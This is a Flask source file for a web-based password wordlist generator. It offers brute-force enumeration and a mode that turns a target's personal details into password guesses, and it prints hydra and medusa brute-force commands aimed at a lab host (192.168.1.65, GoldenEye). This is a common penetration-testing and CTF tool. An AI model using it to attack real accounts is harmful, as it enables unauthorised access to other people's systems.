#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Wordlist Generator - Bir Az Techno
# python3 wordgen.py -> http://127.0.0.1:5000

from flask import Flask, render_template_string, request, Response
import itertools, os, sys

app = Flask(__name__)

HTML = '''<!DOCTYPE html>
<html lang="az">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wordlist Generator</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;min-height:100vh;padding:2rem 1rem}
.container{max-width:860px;margin:0 auto}
.header{display:flex;align-items:center;gap:12px;margin-bottom:2rem;padding-bottom:1rem;border-bottom:1px solid #21262d}
.logo{font-size:22px;font-weight:700;color:#58a6ff;letter-spacing:2px}
.logo span{color:#3fb950}
.sub{font-size:12px;color:#6e7681;margin-top:2px}
.tabs{display:flex;gap:4px;margin-bottom:1.5rem;background:#161b22;padding:4px;border-radius:8px;border:1px solid #21262d}
.tab{flex:1;padding:8px 0;font-size:13px;font-weight:600;border:none;background:transparent;color:#6e7681;cursor:pointer;border-radius:6px;font-family:'Courier New',monospace;letter-spacing:1px;transition:all 0.15s}
.tab.active{background:#0d1117;color:#58a6ff;border:1px solid #30363d}
.section{display:none}
.section.active{display:block}
.card{background:#161b22;border:1px solid #21262d;border-radius:8px;padding:1.25rem;margin-bottom:1rem}
.card-title{font-size:11px;color:#6e7681;letter-spacing:2px;text-transform:uppercase;margin-bottom:1rem}
.field{margin-bottom:1rem}
label{display:block;font-size:12px;color:#8b949e;margin-bottom:6px}
input[type=text],input[type=number]{width:100%;background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:8px 12px;font-size:13px;color:#c9d1d9;font-family:'Courier New',monospace;outline:none;transition:border 0.15s}
input:focus{border-color:#58a6ff}
.row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}
.cb-group{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.cb-item{display:flex;align-items:center;gap:8px;padding:8px 10px;background:#0d1117;border:1px solid #30363d;border-radius:6px;cursor:pointer;font-size:13px;color:#c9d1d9;transition:border 0.15s}
.cb-item:hover{border-color:#58a6ff}
.cb-item input{accent-color:#58a6ff;width:14px;height:14px}
.tip{font-size:11px;color:#484f58;margin-top:4px}
.btn-gen{width:100%;padding:12px;background:#1f6feb;border:none;border-radius:8px;font-size:14px;font-weight:700;color:#fff;cursor:pointer;font-family:'Courier New',monospace;letter-spacing:2px;margin-top:0.5rem;transition:background 0.15s}
.btn-gen:hover{background:#388bfd}
.btn-gen:disabled{background:#21262d;color:#484f58;cursor:not-allowed}
.output{background:#161b22;border:1px solid #21262d;border-radius:8px;overflow:hidden;margin-top:1.5rem;display:none}
.out-header{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;border-bottom:1px solid #21262d}
.out-label{font-size:12px;color:#8b949e;letter-spacing:1px}
.out-stats{display:flex;gap:16px}
.stat{font-size:12px;color:#6e7681}
.stat b{color:#3fb950}
.preview{padding:12px 14px;max-height:200px;overflow-y:auto;font-size:12px;color:#8b949e;line-height:1.8;white-space:pre}
.out-actions{display:flex;gap:8px;padding:10px 14px;border-top:1px solid #21262d}
.act-btn{flex:1;padding:8px;font-size:12px;font-weight:600;border:1px solid #30363d;background:transparent;border-radius:6px;color:#c9d1d9;cursor:pointer;font-family:'Courier New',monospace;letter-spacing:1px;transition:all 0.15s}
.act-btn:hover{background:#21262d;border-color:#58a6ff;color:#58a6ff}
.path-box{display:flex;align-items:center;gap:8px;padding:8px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;margin-top:6px;font-size:12px;color:#6e7681}
.path-box span{color:#3fb950;font-weight:700}
.cmd-box{display:none;margin-top:8px;padding:12px 14px;background:#0d1117;border:1px solid #30363d;border-radius:8px;font-size:12px;line-height:2;color:#c9d1d9;white-space:pre}
.cmd-comment{color:#484f58}
.badge{background:#0d419d;color:#58a6ff;font-size:10px;padding:2px 8px;border-radius:4px;font-weight:700;letter-spacing:1px}
.progress{display:none;margin-top:1rem;background:#0d1117;border:1px solid #21262d;border-radius:6px;overflow:hidden}
.progress-bar{height:4px;background:#1f6feb;width:0%;transition:width 0.1s}
.progress-text{font-size:11px;color:#6e7681;padding:6px 10px}
</style>
</head>
<body>
<div class="container">

<div class="header">
  <div>
    <div class="logo">[ WORD<span>GEN</span> ]</div>
    <div class="sub">Kali Linux Wordlist Generator // Bir Az Techno</div>
  </div>
</div>

<div class="tabs">
  <button class="tab active" onclick="switchTab('brute')">[ BRUTE ]</button>
  <button class="tab" onclick="switchTab('target')">[ HEDEF ]</button>
  <button class="tab" onclick="switchTab('custom')">[ XUSUSI ]</button>
</div>

<!-- BRUTE FORCE TAB -->
<div id="sec-brute" class="section active">
  <div class="card">
    <div class="card-title">// Simvol dəsti</div>
    <div class="cb-group">
      <label class="cb-item"><input type="checkbox" id="cb-lower" checked> a-z  kiçik hərflər</label>
      <label class="cb-item"><input type="checkbox" id="cb-upper"> A-Z  böyük hərflər</label>
      <label class="cb-item"><input type="checkbox" id="cb-digits" checked> 0-9  rəqəmlər</label>
      <label class="cb-item"><input type="checkbox" id="cb-special"> !@#$  xüsusi simvollar</label>
    </div>
  </div>
  <div class="card">
    <div class="card-title">// Parametrlər</div>
    <div class="row3">
      <div class="field">
        <label>Min uzunluq</label>
        <input type="number" id="min-len" value="4" min="1" max="12">
      </div>
      <div class="field">
        <label>Max uzunluq</label>
        <input type="number" id="max-len" value="6" min="1" max="12">
      </div>
      <div class="field">
        <label>Limit (0=sınırsız)</label>
        <input type="number" id="brute-limit" value="50000" min="0">
      </div>
    </div>
    <div class="tip">* Uzun uzunluqlar + böyük charset = çox böyük fayl. Dikkatli ol.</div>
  </div>
</div>

<!-- TARGET TAB -->
<div id="sec-target" class="section">
  <div class="card">
    <div class="card-title">// Hədəf məlumatları</div>
    <div class="row">
      <div class="field"><label>Ad / Ləqəb</label><input type="text" id="t-name" placeholder="boris"></div>
      <div class="field"><label>Soyad</label><input type="text" id="t-surname" placeholder="grishenko"></div>
      <div class="field"><label>Doğum ili</label><input type="text" id="t-year" placeholder="1985"></div>
      <div class="field"><label>Şəhər</label><input type="text" id="t-city" placeholder="baku"></div>
      <div class="field"><label>Hobbi / Söz</label><input type="text" id="t-hobby" placeholder="hacking"></div>
      <div class="field"><label>Şirkət / Layihə</label><input type="text" id="t-org" placeholder="goldeneye"></div>
      <div class="field"><label>Heyvan adı</label><input type="text" id="t-pet" placeholder="mustang"></div>
      <div class="field"><label>Sevimli rəqəm</label><input type="text" id="t-num" placeholder="007"></div>
    </div>
  </div>
  <div class="card">
    <div class="card-title">// Mutasiya seçimləri</div>
    <div class="cb-group">
      <label class="cb-item"><input type="checkbox" id="t-leet" checked> Leet speak (a→4, e→3, i→1)</label>
      <label class="cb-item"><input type="checkbox" id="t-caps" checked> Böyük/kiçik variantlar</label>
      <label class="cb-item"><input type="checkbox" id="t-combine" checked> Söz birləşmələri</label>
      <label class="cb-item"><input type="checkbox" id="t-suffix" checked> Ümumi sonluqlar (123, !)</label>
      <label class="cb-item"><input type="checkbox" id="t-reverse" checked> Tərsinə yazılış</label>
      <label class="cb-item"><input type="checkbox" id="t-year-combo" checked> İl kombinasiyaları</label>
    </div>
  </div>
</div>

<!-- CUSTOM TAB -->
<div id="sec-custom" class="section">
  <div class="card">
    <div class="card-title">// Xüsusi parametrlər</div>
    <div class="field">
      <label>Simvol dəsti</label>
      <input type="text" id="c-charset" placeholder="abcdefghijklmnopqrstuvwxyz0123456789">
    </div>
    <div class="row">
      <div class="field"><label>Min uzunluq</label><input type="number" id="c-min" value="3" min="1" max="12"></div>
      <div class="field"><label>Max uzunluq</label><input type="number" id="c-max" value="5" min="1" max="12"></div>
    </div>
    <div class="row">
      <div class="field">
        <label>Prefix (əvvələ əlavə)</label>
        <input type="text" id="c-prefix" placeholder="admin_">
        <div class="tip">Hər sözün əvvəlinə əlavə edilir</div>
      </div>
      <div class="field">
        <label>Suffix (sona əlavə)</label>
        <input type="text" id="c-suffix" placeholder="123">
        <div class="tip">Hər sözün sonuna əlavə edilir</div>
      </div>
    </div>
    <div class="field"><label>Limit</label><input type="number" id="c-limit" value="10000" min="0"></div>
  </div>
</div>

<!-- FAYL AYARLARI -->
<div class="card">
  <div class="card-title">// Fayl parametrləri</div>
  <div class="field">
    <label>Fayl adı</label>
    <input type="text" id="filename" value="wordlist.txt" oninput="updatePath()">
    <div class="path-box">&#x1F4C2; Saxlanacaq: <span id="save-path">/root/Desktop/wordlist.txt</span></div>
    <div class="tip">Fayl avtomatik /root/Desktop/ qovluğuna saxlanır</div>
  </div>
</div>

<button class="btn-gen" id="gen-btn" onclick="generate()">&#9654; WORDLIST YARAT</button>

<div class="progress" id="progress-box">
  <div class="progress-bar" id="progress-bar"></div>
  <div class="progress-text" id="progress-text">Yaradılır...</div>
</div>

<div class="output" id="output">
  <div class="out-header">
    <div class="out-label">// NƏTİCƏ <span class="badge">HAZIR</span></div>
    <div class="out-stats">
      <div class="stat">Söz: <b id="word-count">0</b></div>
      <div class="stat">Ölçü: <b id="file-size">0 KB</b></div>
    </div>
  </div>
  <div class="preview" id="preview"></div>
  <div class="out-actions">
    <button class="act-btn" onclick="downloadFile()">&#x2B07; Yüklə (.txt)</button>
    <button class="act-btn" onclick="copyAll()">&#x2398; Kopyala</button>
    <button class="act-btn" onclick="saveToDesktop()">&#x1F4BE; Desktop-a saxla</button>
    <button class="act-btn" onclick="showCmd()">&#x24C9; Hydra əmri</button>
  </div>
</div>

<div class="cmd-box" id="cmd-box"></div>

</div>

<script>
let words = [];
let currentTab = 'brute';

function switchTab(t) {
  currentTab = t;
  document.querySelectorAll('.tab').forEach((b,i) => b.classList.remove('active'));
  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
  const idx = ['brute','target','custom'].indexOf(t);
  document.querySelectorAll('.tab')[idx].classList.add('active');
  document.getElementById('sec-'+t).classList.add('active');
}

function updatePath() {
  const fn = document.getElementById('filename').value || 'wordlist.txt';
  document.getElementById('save-path').textContent = '/root/Desktop/' + fn;
}

function* bruteForce(charset, minL, maxL, limit) {
  let count = 0;
  for (let len = minL; len <= maxL; len++) {
    function* rec(cur) {
      if (cur.length === len) { yield cur; return; }
      for (let c of charset) yield* rec(cur + c);
    }
    for (const w of rec('')) {
      yield w;
      count++;
      if (limit && count >= limit) return;
    }
  }
}

function targetGen() {
  const v = {
    name: document.getElementById('t-name').value.trim(),
    surname: document.getElementById('t-surname').value.trim(),
    year: document.getElementById('t-year').value.trim(),
    city: document.getElementById('t-city').value.trim(),
    hobby: document.getElementById('t-hobby').value.trim(),
    org: document.getElementById('t-org').value.trim(),
    pet: document.getElementById('t-pet').value.trim(),
    num: document.getElementById('t-num').value.trim()
  };

  const doLeet = document.getElementById('t-leet').checked;
  const doCaps = document.getElementById('t-caps').checked;
  const doCombine = document.getElementById('t-combine').checked;
  const doSuffix = document.getElementById('t-suffix').checked;
  const doReverse = document.getElementById('t-reverse').checked;
  const doYearCombo = document.getElementById('t-year-combo').checked;

  let base = new Set();
  Object.values(v).forEach(w => { if(w) base.add(w); });

  if (doCaps) {
    [...base].forEach(w => {
      base.add(w.toLowerCase());
      base.add(w.toUpperCase());
      base.add(w[0].toUpperCase() + w.slice(1).toLowerCase());
    });
  }

  if (doReverse) {
    [...base].forEach(w => base.add(w.split('').reverse().join('')));
  }

  if (doCombine) {
    const arr = Object.values(v).filter(Boolean);
    for (let i = 0; i < arr.length; i++) {
      for (let j = 0; j < arr.length; j++) {
        if (i !== j) {
          base.add(arr[i] + arr[j]);
          base.add(arr[i] + '_' + arr[j]);
          base.add(arr[i] + '.' + arr[j]);
        }
      }
    }
  }

  if (doYearCombo) {
    const years = ['2020','2021','2022','2023','2024','2025','1990','1985','1995','2000'];
    if (v.year) years.push(v.year);
    const snap = [...base];
    snap.forEach(w => {
      years.forEach(y => {
        base.add(w + y);
        base.add(y + w);
        base.add(w + y.slice(-2));
      });
    });
  }

  if (doSuffix) {
    const sfx = ['123','1234','12345','!','@','#','!@#','007','_admin','_pass','999','@123','#123','2024','2025','01','69','00'];
    const snap = [...base];
    snap.forEach(w => sfx.forEach(s => base.add(w + s)));
  }

  if (doLeet) {
    const leet = {'a':'4','e':'3','i':'1','o':'0','s':'5','t':'7','l':'1','g':'9','b':'8'};
    const snap = [...base];
    snap.forEach(w => {
      const lw = w.split('').map(c => leet[c.toLowerCase()] || c).join('');
      if (lw !== w) base.add(lw);
    });
  }

  return [...base].filter(w => w.length >= 3);
}

function generate() {
  words = [];
  const btn = document.getElementById('gen-btn');
  btn.disabled = true;
  btn.textContent = '⏳ YARADILIR...';

  setTimeout(() => {
    try {
      if (currentTab === 'brute') {
        let charset = '';
        if (document.getElementById('cb-lower').checked) charset += 'abcdefghijklmnopqrstuvwxyz';
        if (document.getElementById('cb-upper').checked) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        if (document.getElementById('cb-digits').checked) charset += '0123456789';
        if (document.getElementById('cb-special').checked) charset += '!@#$%^&*';
        if (!charset) { alert('Ən az bir simvol dəsti seçin!'); btn.disabled=false; btn.textContent='▶ WORDLIST YARAT'; return; }
        const minL = parseInt(document.getElementById('min-len').value) || 1;
        const maxL = parseInt(document.getElementById('max-len').value) || 4;
        const limit = parseInt(document.getElementById('brute-limit').value) || 0;
        if (minL > maxL) { alert('Min uzunluq max-dan böyük ola bilməz!'); btn.disabled=false; btn.textContent='▶ WORDLIST YARAT'; return; }
        for (const w of bruteForce(charset, minL, maxL, limit || null)) words.push(w);
      } else if (currentTab === 'target') {
        words = targetGen();
      } else {
        const charset = document.getElementById('c-charset').value;
        if (!charset) { alert('Simvol dəsti daxil edin!'); btn.disabled=false; btn.textContent='▶ WORDLIST YARAT'; return; }
        const minL = parseInt(document.getElementById('c-min').value) || 1;
        const maxL = parseInt(document.getElementById('c-max').value) || 4;
        const limit = parseInt(document.getElementById('c-limit').value) || 0;
        const prefix = document.getElementById('c-prefix').value;
        const suffix = document.getElementById('c-suffix').value;
        for (const w of bruteForce(charset, minL, maxL, limit || null)) words.push(prefix + w + suffix);
      }

      if (!words.length) { alert('Heç bir söz yaradılmadı!'); btn.disabled=false; btn.textContent='▶ WORDLIST YARAT'; return; }

      const content = words.join('\\n');
      const kb = (new Blob([content]).size / 1024).toFixed(1);
      document.getElementById('word-count').textContent = words.length.toLocaleString();
      document.getElementById('file-size').textContent = kb + ' KB';

      const prev = words.slice(0, 80).join('\\n') + (words.length > 80 ? '\\n... (' + (words.length - 80) + ' daha var)' : '');
      document.getElementById('preview').textContent = prev;
      document.getElementById('output').style.display = 'block';
      document.getElementById('cmd-box').style.display = 'none';
    } catch(e) {
      alert('Xəta: ' + e.message);
    }

    btn.disabled = false;
    btn.textContent = '▶ WORDLIST YARAT';
  }, 50);
}

function downloadFile() {
  if (!words.length) return;
  const fn = document.getElementById('filename').value || 'wordlist.txt';
  const blob = new Blob([words.join('\\n')], {type:'text/plain'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = fn;
  a.click();
}

function copyAll() {
  if (!words.length) return;
  navigator.clipboard.writeText(words.join('\\n')).then(() => {
    const b = event.target;
    b.textContent = '✓ Kopyalandı!';
    setTimeout(() => b.textContent = '⎘ Kopyala', 1500);
  });
}

function saveToDesktop() {
  if (!words.length) return;
  const fn = document.getElementById('filename').value || 'wordlist.txt';
  fetch('/save', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({filename: fn, content: words.join('\\n')})
  }).then(r => r.json()).then(d => {
    if (d.success) {
      alert('✓ Saxlandı: ' + d.path);
    } else {
      alert('Xəta: ' + d.error);
    }
  });
}

function showCmd() {
  const fn = document.getElementById('filename').value || 'wordlist.txt';
  const box = document.getElementById('cmd-box');
  box.style.display = 'block';
  box.innerHTML = `<span class="cmd-comment"># POP3 brute force (GoldenEye):</span>
hydra -L users.txt -P /root/Desktop/${fn} 192.168.1.65 -s 55007 pop3

<span class="cmd-comment"># SSH brute force:</span>
hydra -L users.txt -P /root/Desktop/${fn} 192.168.1.65 ssh -t 4

<span class="cmd-comment"># Web login (POST):</span>
hydra -L users.txt -P /root/Desktop/${fn} 192.168.1.65 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

<span class="cmd-comment"># Medusa POP3:</span>
medusa -h 192.168.1.65 -n 55007 -M pop3 -U users.txt -P /root/Desktop/${fn} -t 4`;
}
</script>
</body>
</html>'''

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/save', methods=['POST'])
def save():
    import json
    data = request.get_json()
    filename = data.get('filename', 'wordlist.txt')
    content = data.get('content', '')
    # Güvenli fayl adı
    filename = os.path.basename(filename)
    if not filename.endswith('.txt'):
        filename += '.txt'
    path = os.path.join(os.path.expanduser('~'), 'Desktop', filename)
    try:
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)
        return json.dumps({'success': True, 'path': path})
    except Exception as e:
        return json.dumps({'success': False, 'error': str(e)})

if __name__ == '__main__':
    print("\n" + "="*50)
    print("  WORDLIST GENERATOR - Bir Az Techno")
    print("="*50)
    print(f"  Brauzerde ac: http://127.0.0.1:5000")
    print("  Dayandirmaq ucun: Ctrl+C")
    print("="*50 + "\n")
    app.run(host='127.0.0.1', port=5000, debug=False)
